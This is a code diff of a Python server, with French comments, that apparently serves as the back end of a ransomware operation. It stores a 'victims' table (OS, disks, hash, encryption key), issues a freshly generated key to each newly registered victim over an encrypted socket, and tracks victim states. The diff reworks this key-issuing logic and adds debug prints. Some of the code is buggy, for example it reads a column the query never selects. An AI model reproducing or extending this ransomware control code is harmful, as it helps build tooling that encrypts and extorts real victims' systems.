@@ -26,7 +26,6 @@ def get_data_from_db(message_console, conn):
         victims = data.get_list_victims(conn)
         # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
         for victim in victims:
-
             message_response = message.set_message("LIST_RESP", victim)
             # STOCKAGE DANS LA QUEUE DU THREAD DE CONSOLE
             console_thread_queue.put(message_response)
@@ -71,36 +70,42 @@ def get_data_from_db(message_console, conn):
             else:
                 message_response = message.set_message("CHGSTATE", [state])
                 console_thread_queue.put(message_response)
-        elif type_message == "INITIALIZE":
-            select_query = "SELECT v.hash, v.key, v.id_victim FROM victims;"
-            victims = data.select_data(conn, select_query)
-            hash_victim = message_console["INITIALIZE"]
-            found = False
-            i = 0
-            for victim in victims:
-                if hash_victim == victim[0]:
-                    history = data.get_list_history(conn, victim[2])
-                    params = [victim[0], victim[1], history[-1][3]]
-                    message_response = message.set_message("KEY_RESP", params)
-                    front_thread_queue.put(message_response)
-                    found = True
-                    break
-                i += 1
-            if found:
-                pass
-            else:
-                key = security.gen_key(512)
-                items_victim = ["id_victim", "os", "hash", "disks", "key"]
-                contenu_victim = [i, message_console["OS"], hash_victim, message_console["DISKs"], key]
-                data.insert_data(conn, "victims", items_victim, contenu_victim)
-                items_state = ["id_states", i, "datetime", "state"]
-                contenu_state = [1, 'victim_id', datetime.datetime.now().timestamp(), "INITIALIZE"]
-                data.insert_data(conn, "states", items_state, contenu_state)
-                message_response = message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"])
+    elif type_message == "INITIALIZE":
+        print('Hello serveur clé')
+        select_query = "SELECT hash, key FROM victims;"
+        victims = data.select_data(conn, select_query)
+        hash_victim = message_console["INITIALIZE"]
+        print(hash_victim)
+        found = False
+        i = 0
+        for victim in victims:
+            if hash_victim == victim[0]:
+                history = data.get_list_history(conn, victim[2])
+                params = [victim[0], victim[1], history[-1][3]]
+                message_response = message.set_message("KEY_RESP", params)
                 front_thread_queue.put(message_response)
+                found = True
+                break
+            i += 1
+        if found:
+            pass
+            print(i)
         else:
-            message_response = message.set_message("CHGSTATE", ["UNKNOWN"])
-            console_thread_queue.put(message_response)
+            key = security.gen_key(512)
+            items_victim = ["id_victim", "os", "hash", "disks", "key"]
+            contenu_victim = [i + 1, message_console["OS"], hash_victim, str(message_console["DISKS"]), key]
+            data.insert_data(conn, "victims", items_victim, contenu_victim)
+            print(contenu_victim)
+            items_state = ["id_states", "id_victim", "datetime", "state"]
+            print(items_state)
+            contenu_state = [1, i + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
+            data.insert_data(conn, "states", items_state, contenu_state)
+            message_response = message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"])
+            front_thread_queue.put(message_response)
+            print("Coucou")
+    else:
+        message_response = message.set_message("CHGSTATE", ["UNKNOWN"])
+        console_thread_queue.put(message_response)
 
 
 def handle_console(socket_server_console):
@@ -132,35 +137,28 @@ def handle_console(socket_server_console):
                     break
 
 
-
-
-
-
 def handle_frontal(socket_server_frontal):
     global front_thread_queue
     global main_queue
+    print("Frontal server started")
     while True:
         client_socket, address = socket_server_frontal.accept()
         print(client_socket, address)
         key = security.diffie_hellman_recv_key(client_socket)
         encrypted_message_frontal = network.receive_message(client_socket)
+        print("hello oibeoi")
         if encrypted_message_frontal is not None:
             message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
             main_queue.put((message_frontal, client_socket, key))
         else:
             print("Message frontal reçu est None. Ignoré.")
-
-        # Traiter les éléments de la file frontal_thread_queue
-        while not front_thread_queue.empty():
-            # Récupérer les messages de la file frontal_thread_queue et les traiter
-            message_frontal = front_thread_queue.get()
-            # Traitement des messages frontal ici
-            print("Message frontal : ", message_frontal)
-            # Envoi du message frontal à la victime
-            encrypted_message_frontal = security.aes_encrypt(message_frontal, key)
-            network.send_message(client_socket, encrypted_message_frontal)
-
-
+        while front_thread_queue.empty():
+            pass
+        else:
+            while not front_thread_queue.empty():
+                message_front = front_thread_queue.get()
+                encrypted_message_front = security.aes_encrypt(message_front, key)
+                network.send_message(client_socket, encrypted_message_front)
 
 
 def main():
@@ -172,7 +170,6 @@ def main():
     conn = data.connect_db()
     if conn is not None:
         print("Base de données initialisée")
-
 
     console = threading.Thread(target=handle_console, args=(socket_server_console,))
     frontal = threading.Thread(target=handle_frontal, args=(socket_server_frontal,))
@@ -188,8 +185,5 @@ def main():
             get_data_from_db(message_console, conn)
 
 
-
-
 if __name__ == '__main__':
     main()
-
